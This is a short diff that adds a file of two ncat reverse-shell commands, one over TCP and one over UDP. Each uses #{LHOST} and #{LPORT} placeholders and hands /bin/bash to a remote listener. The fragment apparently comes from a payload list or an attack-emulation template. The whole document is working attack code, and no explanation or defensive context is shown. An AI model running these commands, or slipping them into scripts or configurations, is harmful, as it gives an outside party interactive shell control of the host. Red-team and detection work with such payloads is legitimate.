@@ -1,0 +1,3 @@
+ncat #{LHOST} #{LPORT} -e /bin/bash
+
+ncat --udp #{LHOST} #{LPORT} -e /bin/bash
